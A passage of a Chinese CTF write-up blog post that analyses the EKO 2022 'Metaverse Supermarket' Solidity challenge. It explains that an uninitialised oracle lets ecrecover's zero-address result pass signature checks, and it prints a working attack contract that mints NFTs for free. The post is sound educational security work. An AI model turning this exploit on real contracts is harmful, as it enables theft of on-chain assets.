+<p>最后调用Pelusa合约中的shoot函数即完成攻击。</p>
+<h1 id="Metaverse-Supermarket"><a href="#Metaverse-Supermarket" class="headerlink" title="Metaverse Supermarket"></a>Metaverse Supermarket</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts/utils/cryptography/EIP712.sol&quot;;</span><br><span class="line"></span><br><span class="line">struct OraclePrice &#123;</span><br><span class="line">    uint256 blockNumber;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32 r;</span><br><span class="line">    bytes32 s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract contract InflaStoreEIP712 is EIP712 &#123;</span><br><span class="line">    bytes32 public constant ORACLE_PRICE_TYPEHASH = keccak256(&quot;OraclePrice(uint256 blockNumber,uint256 price)&quot;);</span><br><span class="line"></span><br><span class="line">    function _hashOraclePrice(OraclePrice memory oraclePrice) internal view returns (bytes32 hash) &#123;</span><br><span class="line">        return _hashTypedDataV4(</span><br><span class="line">            keccak256(abi.encode(ORACLE_PRICE_TYPEHASH, oraclePrice.blockNumber, oraclePrice.price))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Metaverse Supermarket</span><br><span class="line">/// @author https://twitter.com/adrianromero</span><br><span class="line">/// @notice We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. You are out of INFLAs and you are starving, can you defeat the system?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarket</span><br><span class="line">contract InflaStore is InflaStoreEIP712 &#123;</span><br><span class="line">    Meal public immutable meal;</span><br><span class="line">    Infla public immutable infla;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    address private oracle;</span><br><span class="line"></span><br><span class="line">    uint256 public constant MEAL_PRICE = 1e6;</span><br><span class="line">    uint256 public constant BLOCK_RANGE = 10;</span><br><span class="line"></span><br><span class="line">    constructor(address player) EIP712(&quot;InflaStore&quot;, &quot;1.0&quot;) &#123;</span><br><span class="line">        meal = new Meal();</span><br><span class="line">        infla = new Infla(player, 10);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setOracle(address _oracle) external &#123;</span><br><span class="line">        require(owner == msg.sender, &quot;!owner&quot;);</span><br><span class="line">        oracle = _oracle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external &#123;</span><br><span class="line">        _mintMeal(msg.sender, MEAL_PRICE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external &#123;</span><br><span class="line">        _validateOraclePrice(oraclePrice, signature);</span><br><span class="line">        _mintMeal(msg.sender, oraclePrice.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mintMeal(address buyer, uint256 price) private &#123;</span><br><span class="line">        infla.transferFrom(buyer, address(this), price);</span><br><span class="line">        meal.safeMint(buyer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view &#123;</span><br><span class="line">        require(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, &quot;price too old!&quot;);</span><br><span class="line"></span><br><span class="line">        bytes32 oracleHash = _hashOraclePrice(oraclePrice);</span><br><span class="line">        address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);</span><br><span class="line"></span><br><span class="line">        require(recovered == oracle, &quot;not oracle!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) &#123;</span><br><span class="line">        require(v == 27 || v == 28, &quot;invalid v!&quot;);</span><br><span class="line">        return ecrecover(digest, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">import &quot;solmate/tokens/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Meal is ERC721(&quot;Meal&quot;, &quot;MEAL&quot;) &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line">    uint256 private _tokenIdCounter;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeMint(address to) external &#123;</span><br><span class="line">        require(_owner == msg.sender, &quot;Only owner can mint&quot;);</span><br><span class="line">        uint256 tokenId = _tokenIdCounter;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++_tokenIdCounter;</span><br><span class="line">        &#125;</span><br><span class="line">        _safeMint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256) public pure override returns (string memory) &#123;</span><br><span class="line">        return &quot;ipfs://QmQqCFY7Dt9SFgadayt8eeTr7i5XauiswxeLysexbymGp1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">import &quot;solmate/tokens/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Infla is ERC20(&quot;INFLA&quot;, &quot;INF&quot;, 18) &#123;</span><br><span class="line">    constructor(address player, uint256 amount) &#123;</span><br><span class="line">        _mint(player, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.<br>You are out of INFLAs and you are starving, can you defeat the system?</p>
+</blockquote>
+<p>大意就是合约跟预言机的漏洞有关，我们重点关注预言机的相关逻辑。</p>
+<p>题目中存在三个合约，一个ERC20代币，一个ERC721代币，和一个nft的store合约。</p>
+<p>主要功能就是store提供nft出售，如果不通过预言机购买需要支付1e6个infla代币来购买一个nft，而如果通过签名后的预言机进行购买的话，只需要支付预言机中的价格即可，乍一看貌似没有什么问题。</p>
+<p>我们先看看我们的通关条件。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319201824164.png" alt="image-20230319201824164"></p>
+<p>我们发现我们需要得到十个以上的nft才能完成本关。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319201937424.png" alt="image-20230319201937424"></p>
+<p>同样在工厂合约中发现，store函数只经过了部署，预言机并没有在构造函数和工厂合约进行初始化，当然，没有这个工厂合约的话通过web3的方法也能够发现oracle并没有被初始化。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319202059425.png" alt="image-20230319202059425"></p>
+<p>而在关键的延签函数中是根据我们传入的签名来验证是否经过了oracle的签名，在这里需要提一句ecrecover的机制了，如果传入的消息哈希和签名不对应或者说是不正确的话，ecrecover会返回一个零地址，而在oracle未被初始化的情况之下，他俩刚好相等，那我们就可以无限制的给自己买回nft。</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    InflaStore store;</span><br><span class="line">    constructor(address _store)&#123;</span><br><span class="line">        store = InflaStore(_store);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function att()public&#123;</span><br><span class="line">        OraclePrice memory ora;</span><br><span class="line">        ora.blockNumber = block.number-1;</span><br><span class="line">        ora.price = 0;</span><br><span class="line"></span><br><span class="line">        Signature memory sig;</span><br><span class="line">        sig.v = 27;</span><br><span class="line"></span><br><span class="line">        for(uint i=0;i&lt;11;i++)&#123;</span><br><span class="line">            store.buyUsingOracle(ora,sig);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trans()public&#123;</span><br><span class="line">        // store.meal().transferFrom(address(this),msg.sender,11);</span><br><span class="line">        for (uint i=0;i&lt;11;i++)&#123;</span><br><span class="line">            store.meal().transferFrom(address(this),msg.sender,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address,</span><br><span class="line">        address,</span><br><span class="line">        uint256,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external virtual returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依次调用att和transfer即可。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/" title="EKO-CTF(一)">http://example.com/2023/03/17/EKO-CTF-一/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/06/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/" rel="prev" title="ChainFlag靶场实战（三）">
+      <i class="fa fa-chevron-left"></i> ChainFlag靶场实战（三）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/19/EKO-CTF-%E4%BA%8C/" rel="next" title="EKO-CTF(二)">
+      EKO-CTF(二) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Phoenixtto"><span class="nav-number">1.</span> <span class="nav-text">Phoenixtto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pelusa"><span class="nav-number">2.</span> <span class="nav-text">Pelusa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Metaverse-Supermarket"><span class="nav-number">3.</span> <span class="nav-text">Metaverse Supermarket</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">知而不行，谓之不诚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">238k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:37</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
